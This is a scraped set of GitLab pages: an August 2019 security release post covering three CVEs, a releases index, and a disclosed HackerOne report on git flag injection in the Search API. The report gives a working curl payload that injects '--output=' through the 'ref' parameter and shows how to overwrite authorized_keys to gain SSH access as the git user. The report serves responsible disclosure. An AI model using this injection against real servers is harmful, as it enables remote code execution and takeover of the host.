=== Content from about.gitlab.com_920d04f5_20250120_231001.html ===


[‚Üê
Back to
releases](/releases/categories/releases/)
Aug 12, 2019

-
[Juan Broullon](/company/team/#jbroullon)
# GitLab Critical Security Release: 12.1.6, 12.0.6, and 11.11.8

Learn more about GitLab Critical Security Release: 12.1.6, 12.0.6, and 11.11.8 for GitLab Community Edition (CE) and Enterprise Edition (EE)

Today we are releasing versions 12.1.6, 12.0.6, and 11.11.8 for GitLab Community Edition (CE) and Enterprise Edition (EE).

These versions contain a number of important security fixes, and we strongly recommend that all GitLab installations be upgraded to one of these versions immediately.

The vulnerability details will be made public on our issue tracker in approximately 30 days.

Please read on for more information regarding this release.

## Insecure Authentication Methods Disabled for Grafana By Default

Basic authentication and hard-coded admin credentials are now disabled by default in the bundled Grafana instance as part of the Omnibus-based GitLab packages.
This change forces GitLab SSO to be the only authentication method, creates a backup of existing data, and resets the Grafana configuration to the GitLab default.
Custom dashboards and user accounts that have been created will be preserved in the backup. Grafana authentication settings can then be modified following the
[Omnibus Configuration Settings](https://docs.gitlab.com/omnibus/settings/grafana.html) guide.

The Grafana dashboard, when accessed using the hard-coded credentials, allowed for a malicious user to view internal resources that are accessible
by the host where the GitLab instance resides.

The issue is now mitigated in the latest release and is assigned [CVE-2019-14943](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14943).

Thanks to [@stargo](https://gitlab.com/stargo) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab CE/EE 12.0 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above to be upgraded to the latest version as soon as possible.

## Updating

To update, check out our [update page](/update/).

## Multiple Command-Line Flag Injection Vulnerabilities

Improper parameter sanitization on Gitaly could lead to privilege escalation and remote code execution vulnerabilities under certain conditions. The issue is now mitigated in the latest release and is assigned [CVE-2019-14944](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14944).

Thanks to [@vakzz](https://hackerone.com/vakzz) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab CE/EE 10.0 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above to be upgraded to the latest version as soon as possible.

## Updating

To update, check out our [update page](/update/).

## Insecure Cookie Handling on GitLab Pages

Authentication cookies on GitLab Pages with Access Control could be sent over HTTP and weren't properly encrypted, which made them vulnerable to Man-In-The-Middle attacks. The issue is now mitigated in the latest release and is assigned [CVE-2019-14942](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14942).

This issue was internally discovered by the GitLab Security Team.

### Versions Affected

Affects GitLab CE/EE 11.5 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above to be upgraded to the latest version as soon as possible.

## Updating

To update, check out our [update page](/update/).

[GitLab Critical Security Release: 12.1.6, 12.0.6, and 11.11.8

Click to tweet!](http://twitter.com/share?text=GitLab+Critical+Security+Release%3A+12.1.6%2C+12.0.6%2C+and+11.11.8&url=https://about.gitlab.com/releases/2019/08/12/critical-security-release-gitlab-12-dot-1-dot-6-released/&hashtags= "Tweet!")

* [security](/releases/tags.html#security)
* [security releases](/releases/tags.html#security-releases)

[Share on Facebook](http://www.facebook.com/sharer.php?u=https://about.gitlab.com/releases/2019/08/12/critical-security-release-gitlab-12-dot-1-dot-6-released/)
[Share on X](http://x.com/share?url=https://about.gitlab.com/releases/2019/08/12/critical-security-release-gitlab-12-dot-1-dot-6-released/&text=GitLab Critical Security Release: 12.1.6, 12.0.6, and 11.11.8)
[Share on LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https://about.gitlab.com/releases/2019/08/12/critical-security-release-gitlab-12-dot-1-dot-6-released/&title=GitLab Critical Security Release: 12.1.6, 12.0.6, and 11.11.8&summary=&source=)
[Share on Hacker News](https://news.ycombinator.com/submitlink?u=https://about.gitlab.com/releases/2019/08/12/critical-security-release-gitlab-12-dot-1-dot-6-released/&t=GitLab Critical Security Release: 12.1.6, 12.0.6, and 11.11.8)

* [Previous Post:
  GitLab Patch Release: 12.1.4](/releases/2019/08/06/gitlab-12-1-4-released/ "GitLab Patch Release: 12.1.4")
* [Next Post:
  GitLab 12.2 released with Directed Acyclic Graphs for
  ...](/releases/2019/08/22/gitlab-12-2-released/ "GitLab 12.2 released with Directed Acyclic Graphs for Pipelines and Design Management")

Sign up for GitLab's monthly newsletter

Thanks for subscribing!

### We want to hear from you

Enjoyed reading this blog post or have questions or feedback? Share your thoughts by creating a new topic in the GitLab community forum.

[Share your feedback](https://forum.gitlab.com/new-topic?title=GitLab Critical Security Release: 12.1.6, 12.0.6, and 11.11.8&body=&tags=blog-feedback)

## Take GitLab for a spin

See what your team could do with The DevSecOps Platform.

[Get free trial](https://gitlab.com/-/trials/new?glm_content=default-saas-trial&glm_source=about.gitlab.com)

![](/images/cta/gitlab-enterprise-team-member-photos.png)

Have a question? We're here to help.

[Talk to an expert](https://about.gitlab.com/sales/)

[Edit this page](https://gitlab.com/-/ide/project/gitlab-com/www-gitlab-com/edit/master/-/sites/uncategorized/source/releases/posts/2019-08-12-critical-security-release-gitlab-12-dot-1-dot-6-released.html.md)
[View source](https://gitlab.com/gitlab-com/www-gitlab-com/blob/master/sites/uncategorized/source/releases/posts/2019-08-12-critical-security-release-gitlab-12-dot-1-dot-6-released.html.md)



=== Content from about.gitlab.com_821e743a_20250120_231000.html ===


# Releases

### Subscribe

Thanks for subscribing!

Search the blog

### Categories

* [All Blogs](/blog/archives.html)
* [AI/ML](/blog/categories/ai-ml/)
* [careers](/blog/categories/careers/)
* [company](/blog/categories/company/)
* [culture](/blog/categories/culture/)
* [DevOps](/blog/categories/devops/)
* [DevOps Platform](/blog/categories/devops-platform/)
* [devSecOps](/blog/categories/devsecops/)
* [devSecOps Platform](/blog/categories/devsecops-platform/)
* [engineering](/blog/categories/engineering/)
* [insights](/blog/categories/insights/)
* [news](/blog/categories/news/)
* [open source](/blog/categories/open-source/)
* [releases](/releases/categories/releases/)
* [security](/blog/categories/security/)

### Follow Us

Featured Post

[Joe Randazzo](/company/team/#jrandazzo)

Jan 16, 2025

[## GitLab 17.8 released](/releases/2025/01/16/gitlab-17-8-released/)

GitLab 17.8 released with enhanced security for container repositories, ML model experiments tracking, list deployments related to a release, Hosted runners on Linux for GitLab Dedicated, and much more!
[Read on](/releases/2025/01/16/gitlab-17-8-released/)

### Recent Posts

[![Post Image](/images/default-blog-image.png)](/releases/2025/01/15/gitlab-17-7-2-released/)
[### GitLab Patch Release: 17.7.2](/releases/2025/01/15/gitlab-17-7-2-released/)
[Mayra Cabrera](/company/team/#gitlab)

Jan 15, 2025

GitLab releases 17.7.2

[![Post Image](/images/blogimages/security-cover-new.png)](/releases/2025/01/08/patch-release-gitlab-17-7-1-released/)
[### GitLab Patch Release: 17.7.1, 17.6.3, 17.5.5](/releases/2025/01/08/patch-release-gitlab-17-7-1-released/)
[Greg Alfaro](/company/team/#gitlab)

Jan 8, 2025

Learn more about GitLab Patch Release: 17.7.1, 17.6.3, 17.5.5 for GitLab Community Edition (CE) and Enterprise Edition (EE).

[![Post Image](/images/17_7/17_7-cover-image.png)](/releases/2024/12/19/gitlab-17-7-released/)
[### GitLab 17.7 released](/releases/2024/12/19/gitlab-17-7-released/)
[Courtney Meddaugh](/company/team/#courtmeddaugh)

Dec 19, 2024

GitLab 17.7 released with a new Planner user role, auto-resolution policy for vulnerabilities, admin-controlled instance integration allowlists, access token rotation in the UI and much more!

[![Post Image](/images/blogimages/security-cover-new.png)](/releases/2024/12/11/patch-release-gitlab-17-6-2-released/)
[### GitLab Patch Release: 17.6.2, 17.5.4, 17.4.6](/releases/2024/12/11/patch-release-gitlab-17-6-2-released/)
[Costel Maxim](/company/team/#gitlab)

Dec 11, 2024

Learn more about GitLab Patch Release: 17.6.2, 17.5.4, 17.4.6 for GitLab Community Edition (CE) and Enterprise Edition (EE).

[![Post Image](/images/blogimages/security-cover-new.png)](/releases/2024/11/26/patch-release-gitlab-17-6-1-released/)
[### GitLab Patch Release: 17.6.1, 17.5.3, 17.4.5](/releases/2024/11/26/patch-release-gitlab-17-6-1-released/)
[Ottilia Westerlund](/company/team/#gitlab)

Nov 26, 2024

Learn more about GitLab Patch Release: 17.6.1, 17.5.3, 17.4.5 for GitLab Community Edition (CE) and Enterprise Edition (EE).

[![Post Image](/images/17_6/17_6-cover-image.png)](/releases/2024/11/21/gitlab-17-6-released/)
[### GitLab 17.6 released](/releases/2024/11/21/gitlab-17-6-released/)
[Magdalena Frankiewicz](/company/team/#m_frankiewicz)

Nov 21, 2024

GitLab 17.6 released with self-hosted Duo Chat in beta, adherence checks for SAST and DAST security scanners, vulnerability report grouping, model registry and much more!

[![Post Image](/images/blogimages/security-cover-new.png)](/releases/2024/11/13/patch-release-gitlab-17-5-2-released/)
[### GitLab Patch Release: 17.5.2, 17.4.4, 17.3.7](/releases/2024/11/13/patch-release-gitlab-17-5-2-released/)
[Greg Myers](/company/team/#gitlab)

Nov 13, 2024

Learn more about GitLab Patch Release: 17.5.2, 17.4.4, 17.3.7 for GitLab Community Edition (CE) and Enterprise Edition (EE).

[![Post Image](/images/blogimages/security-cover-new.png)](/releases/2024/10/23/patch-release-gitlab-17-5-1-released/)
[### GitLab Patch Release: 17.5.1, 17.4.3, 17.3.6](/releases/2024/10/23/patch-release-gitlab-17-5-1-released/)
[Kevin Morrison](/company/team/#gitlab)

Oct 23, 2024

Learn more about GitLab Patch Release: 17.5.1, 17.4.3, 17.3.6 for GitLab Community Edition (CE) and Enterprise Edition (EE).

[![Post Image](/images/17_5/17_5-cover-image.png)](/releases/2024/10/17/gitlab-17-5-released/)
[### GitLab 17.5 released](/releases/2024/10/17/gitlab-17-5-released/)
[John Crowley](/company/team/#johncrowley)

Oct 17, 2024

GitLab 17.5 released with code assistance in IDEs from GitLab Duo Quick Chat, self-hosted models for GitLab Duo Code Suggestions, export code suggestion usage events, MR conversations with GitLab Duo Chat and much more!

[![Post Image](/images/blogimages/security-cover-new.png)](/releases/2024/10/09/patch-release-gitlab-17-4-2-released/)
[### GitLab Critical Patch Release: 17.4.2, 17.3.5, 17.2.9](/releases/2024/10/09/patch-release-gitlab-17-4-2-released/)
[Nikhil George](/company/team/#gitlab)

Oct 9, 2024

Learn more about GitLab Critical Patch Release: 17.4.2, 17.3.5, 17.2.9 for GitLab Community Edition (CE) and Enterprise Edition (EE).

[![Post Image](/images/blogimages/security-cover-new.png)](/releases/2024/09/25/patch-release-gitlab-16-10-10-released/)
[### GitLab Critical Patch Release: 16.10.10, 16.9.11, 16.8.10, 16.7.10, 16.6.10, 16.5.10, 16.4.7, 16.3.9, 16.2.11, 16.1.8, 16.0.10](/releases/2024/09/25/patch-release-gitlab-16-10-10-released/)
[Greg Myers](/company/team/#gitlab)

Sep 25, 2024

Learn more about GitLab Critical Patch Release: 16.10.10, 16.9.11, 16.8.10, 16.7.10, 16.6.10, 16.5.10, 16.4.7, 16.3.9, 16.2.11, 16.1.8, 16.0.10 for GitLab Community Edition (CE) and Enterprise Edition (EE).

[![Post Image](/images/blogimages/security-cover-new.png)](/releases/2024/09/25/patch-release-gitlab-17-4-1-released/)
[### GitLab Patch Release: 17.4.1, 17.3.4, 17.2.8](/releases/2024/09/25/patch-release-gitlab-17-4-1-released/)
[Greg Myers](/company/team/#gitlab)

Sep 25, 2024

Learn more about GitLab Patch Release: 17.4.1, 17.3.4, 17.2.8 for GitLab Community Edition (CE) and Enterprise Edition (EE).

[![Post Image](/images/17_4/17_4-cover-image.png)](/releases/2024/09/19/gitlab-17-4-released/)
[### GitLab 17.4 released](/releases/2024/09/19/gitlab-17-4-released/)
[Alex Martin](/company/team/#alex_martin)

Sep 19, 2024

GitLab 17.4 released with more context-aware GitLab Duo Code Suggestions using open tabs, auto-merge when all checks pass, extension marketplace in the Web IDE, list Kubernetes resource events and much more!

[![Post Image](/images/blogimages/security-cover-new.png)](/releases/2024/09/17/patch-release-gitlab-17-3-3-released/)
[### GitLab Critical Patch Release: 17.3.3, 17.2.7, 17.1.8, 17.0.8, 16.11.10](/releases/2024/09/17/patch-release-gitlab-17-3-3-released/)
[Rohit Shambhuni](/company/team/#gitlab)

Sep 17, 2024

Learn more about GitLab Critical Patch Release: 17.3.3, 17.2.7, 17.1.8, 17.0.8, 16.11.10 for GitLab Community Edition (CE) and Enterprise Edition (EE).

[![Post Image](/images/default-blog-image.png)](/releases/2024/09/11/gitlab-16-11-9-released/)
[### GitLab Patch Release: 16.11.9](/releases/2024/09/11/gitlab-16-11-9-released/)
[Ahmad Tolba](/company/team/#gitlab)

Sep 11, 2024

GitLab releases 16.11.9

* Prev
* 1
* [2](/releases/categories/releases/p2/)
* [3](/releases/categories/releases/p3/)
* [Next](/releases/categories/releases/p2/)

[Edit this page](https://gitlab.com/-/ide/project/gitlab-com/www-gitlab-com/edit/master/-/sites/uncategorized/source/category.html.haml)
[View source](https://gitlab.com/gitlab-com/www-gitlab-com/blob/master/sites/uncategorized/source/category.html.haml)



=== Content from gitlab.com_6f13a443_20250120_231003.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Git flag injection - local file overwrite to remote code execution

**[HackerOne report #658013](https://hackerone.com/reports/658013)** by `vakzz` on 2019-07-24, assigned to `hackerjuan`:

### Summary

The `wiki_blobs` scope of the Search API can be provided with an arbitrary `ref` parameter, allowing for additional flags to be injected into the git command.

For example the following API call:

```
`curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'`
```

The above will generate the following git command causing the the last commit log to be written to `/tmp/file`

```
    /opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.wiki.git log --max-count=1 --output=/tmp/file
```

### Steps to reproduce

1. Create a wiki new wiki page called `page` with the commit message `controlled content`
2. Search for the wiki blob via the Search API, with the injected ref flag:

```
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

3. See that the file has been created:

```
git@gitlab-vm:~$ cat /tmp/file
commit f00f9538d29b176e9dfb2eb1bfe1eab190cad3d9
Author: Administrator <admin@example.com>
Date:   Wed Jul 24 13:08:51 2019 +0000

    controlled content
```

### Impact

This can be used to overwrite `/var/opt/gitlab/.ssh/authorized_keys` with an attackers key by following the above steps allowing remote access and code execution.

1. Create a new rsa key
2. Create a new wiki page setting the commit message to the rsa public key
3. Run the Search API with `ref=--output=/var/opt/gitlab/.ssh/authorized_keys`
4. ssh into gitlab using the created key:

```
$ ssh git@gitlab-vm.local -i gitlab
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-70-generic x86_64)
$ id
uid=998(git) gid=998(git) groups=998(git)

$ cat /var/opt/gitlab/.ssh/authorized_keys
commit 00c8e52996654d02bcbdba47dc25ee73671cbfd6
Author: Administrator <admin@example.com>
Date:   Wed Jul 24 12:56:23 2019 +0000

    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxsqkWZobL5DBOnM3rtE7ZDP4d9v0lABJRGJbovHHTNY2iH3x3pjjerPfLDO21Gkyfzn4J+x6O6GleMAB5nxnZRH7E44khfW6Ldql29Rv2Q/IYCsBSKxGT6RCOFusoRi1uHlQmexIh4gZkmPeFfDLTy70Xv3FpPLfKE/EiVOjuEtY9JUC4MVlPHaTzZ2HE4sZT5tvcm9YtSpjT2v0SMR8uCXcKMAx4Tsu/Un2N5UziXgtRF+vD0fRhNyKIkOtULwBgWkL5RE71vYbxOhviqTAld7r70TIWSzSUHcUewbMS5XcEdBwl3XI/9qzo+jOA0Ulf2bkkROpELBoHwfLdpu9p will@MacBook-Pro.local
```

### What is the current *bug* behavior?

The `ref` param is passed directly to the git command without being sanitized.

### What is the expected *correct* behavior?

The `ref` param should be sanitized or used in a way that doesn't allow for flag injection

#### Results of GitLab environment info

```
$ sudo gitlab-rake gitlab:env:info

System information
System:		Ubuntu 16.04
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.1.0
Revision:	295480f4553
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.7
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	9.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

An attacker can overwrite or create files with mostly controlled content, allowing them to gain remote ssh access to gitlab as the `git` user

To upload designs, you'll need to enable LFS and have an admin enable hashed storage. [More information](/help/user/project/issues/design_management.md#prerequisites)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


